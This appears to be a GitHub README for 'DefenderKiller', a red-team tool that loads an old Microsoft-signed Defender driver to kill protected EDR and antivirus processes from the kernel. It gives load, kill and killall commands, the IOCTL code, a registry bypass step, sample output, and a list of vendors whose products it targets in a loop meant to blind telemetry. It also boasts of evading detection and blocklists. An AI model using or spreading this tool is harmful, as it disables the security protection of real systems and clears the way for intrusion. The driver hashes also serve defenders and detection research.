# DefenderKiller

![DefenderKiller Banner](banner.png)

**Kernel process termination using Microsoft's own signed driver.**

KSLDriver.sys (2011) — a Microsoft Malware Protection driver signed by Microsoft Code Signing PCA — contains a `ZwTerminateProcess` primitive accessible via IOCTL from ring 0. DefenderKiller weaponizes this driver to terminate any process on the system, including PPL-protected and EDR-protected processes.

## ⚠️ Disclaimer

This tool is provided for **authorized security testing and educational purposes only**. Use only on systems you own or have explicit written permission to test. The author is not responsible for any misuse.

## 📝 Blog Post

Full reverse engineering writeup and technical breakdown:

**[Born to Defend, Weaponized to Kill: Weaponizing Microsoft's Own Driver to Kill EDRs](https://medium.com/@jehadbudagga/born-to-defend-weaponized-to-kill-weaponizing-microsofts-own-driver-to-kill-edrs-af4b85c1a43c)**

## Why This Is Different

Every BYOVD tool out there relies on third-party drivers. DefenderKiller uses **Microsoft's own signed Defender driver** against itself.

- **0/70 detection** on VirusTotal
- **Microsoft Code Signing PCA** signed — trusted at the highest level
- **Not on the Vulnerable Driver Blocklist** — Microsoft excludes their own drivers by design
- **Bypasses PPL** — `ZwTerminateProcess` from kernel mode ignores Protected Process Light
- **Bypasses ObRegisterCallbacks** — `ZwOpenProcess` from ring 0 skips EDR handle protection
- **Survives April 2026 driver trust policy** — WHCP attestation-signed drivers are still trusted

## How It Works

1. Load the Microsoft-signed KSLDriver.sys with a custom service
2. Bypass the `AllowedProcessName` check by writing our own path to the registry
3. Send IOCTL `0x222044` sub-command 8 with the target PID
4. Close the handle — `IRP_MJ_CLEANUP` fires `ZwTerminateProcess` from kernel mode
5. Target process terminated. No callback intercepts it. No protection blocks it.

## Usage

```
DefenderKiller.exe load C:\path\to\KSLDriver_2011.sys
DefenderKiller.exe kill <PID or process name>
DefenderKiller.exe killall [--interval <ms>] [--list <file>]
DefenderKiller.exe unload
```

### Commands

| Command | Description |
|---------|-------------|
| `load <driver_path>` | Load KSLDriver.sys and register the kernel service |
| `kill <PID \| name>` | Terminate a single process by PID or name |
| `killall` | Continuous loop that scans for and kills all known EDR/AV processes |
| `unload` | Stop the driver and remove the service |

### killall Options

| Option | Default | Description |
|--------|---------|-------------|
| `--interval <ms>` | 500 | Time between sweeps in milliseconds (minimum 100) |
| `--list <file>` | — | Path to a text file with additional process names to target (one per line, `#` comments supported) |

### Example — Single Kill

```
C:\> DefenderKiller.exe load C:\KSLDriver_2011.sys
[+] Driver loaded successfully

C:\> DefenderKiller.exe kill MsMpEng.exe
[+] Killed MsMpEng.exe (PID 4628)

C:\> DefenderKiller.exe unload
[+] Driver unloaded and service removed
```

### Example — Continuous EDR Kill Loop

```
C:\> DefenderKiller.exe load C:\KSLDriver_2011.sys
[+] Driver loaded successfully

C:\> DefenderKiller.exe killall
[*] EDR killer loop started (85 built-in + 0 custom targets)
[*] Scan interval: 500 ms
[*] Press Ctrl+C to stop

[+] Killed MsMpEng.exe (PID 4628)
[+] Killed MsSense.exe (PID 3912)
[*] Sweep #1: killed 2 processes (total: 2)
[+] Killed MsMpEng.exe (PID 7104)
[*] Sweep #4: killed 1 processes (total: 3)
```

### Example — Custom Target List

```
C:\> type custom_edr.txt
# Custom EDR processes for this engagement
CustomEDR.exe
InternalAV.exe
MonitorSvc.exe

C:\> DefenderKiller.exe killall --interval 1000 --list custom_edr.txt
[*] Loaded 3 custom targets from custom_edr.txt
[*] EDR killer loop started (85 built-in + 3 custom targets)
[*] Scan interval: 1000 ms
[*] Press Ctrl+C to stop
```

## EDR Kill Loop — Why It Matters

The original PoC demonstrated the kernel kill primitive but only targeted a single process once. In real engagements, this isn't enough:

- **Watchdog services** — Most EDRs run a watchdog that respawns the main agent within seconds of termination
- **Multiple processes** — A single EDR product may run 3-5+ processes (sensor, UI, update service, etc.)
- **Layered defenses** — Targets often run multiple security products simultaneously

The `killall` command solves this by continuously sweeping the process list and terminating any EDR process that appears. It includes a built-in database of 85+ process names covering major EDR/AV vendors:

- Microsoft Defender / MDE
- CrowdStrike Falcon
- SentinelOne
- VMware Carbon Black
- Palo Alto Cortex XDR
- Sophos
- Elastic EDR
- Symantec / Broadcom
- Trend Micro
- ESET
- Cylance
- McAfee / Trellix
- Kaspersky
- Bitdefender
- F-Secure / WithSecure
- Malwarebytes
- Fortinet FortiEDR
- Cybereason
- Qualys

## Driver Details

| Property | Value |
|----------|-------|
| **File** | KSLDriver.sys |
| **Description** | Microsoft Malware Protection - KSLDriver |
| **Product** | Microsoft Malware Protection |
| **Version** | 1.1.0013.0 |
| **Size** | 34.83 KB (35,664 bytes) |
| **Architecture** | x64 (64-bit native) |
| **Date Signed** | September 16, 2011 |
| **Signer** | Microsoft Corporation |
| **Certificate** | Microsoft Code Signing PCA → Microsoft Root Authority |
| **Detection** | **0/70** on VirusTotal |
| **SHA-256** | `d5764d24e78914ab2a9db6b24e323342d0b37998f43add1a9e49b00992b0d645` |
| **MD5** | `0ebb390b7aeec45ec061d9870a34fd42` |
| **SHA-1** | `7772c1215e31836cc8d830cb65f224ec929cfb69` |
| **Imphash** | `8bf2a95defbf5214f859fd3f24f64e5f` |
| **Authentihash** | `0a19385f73a265d8086a8b1304873110ce33a37ce08d442b9fb9390c82fa50e7` |
| **VirusTotal** | [Full Analysis](https://www.virustotal.com/gui/file/d5764d24e78914ab2a9db6b24e323342d0b37998f43add1a9e49b00992b0d645) |


## Note

The `killall` command addresses the main limitation of the original PoC — EDR process respawning. However, some kernel-level EDR components (minifilter drivers, ETW providers) will remain loaded even after their usermode processes are killed. The kill loop keeps the usermode components down, which is sufficient to blind most EDR telemetry pipelines, but kernel callbacks may still fire. Combine with other techniques as needed for full coverage.

## Author

**Jehad Abudagga**

[![X](https://img.shields.io/badge/X-@j3h4ck-000000?style=flat&logo=x)](https://x.com/j3h4ck)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Jehad%20Abudagga-0A66C2?style=flat&logo=linkedin)](https://www.linkedin.com/in/jehad-abudagga)
[![Medium](https://img.shields.io/badge/Medium-@jehadbudagga-12100E?style=flat&logo=medium)](https://medium.com/@jehadbudagga)
[![GitHub](https://img.shields.io/badge/GitHub-redteamfortress-181717?style=flat&logo=github)](https://github.com/redteamfortress)
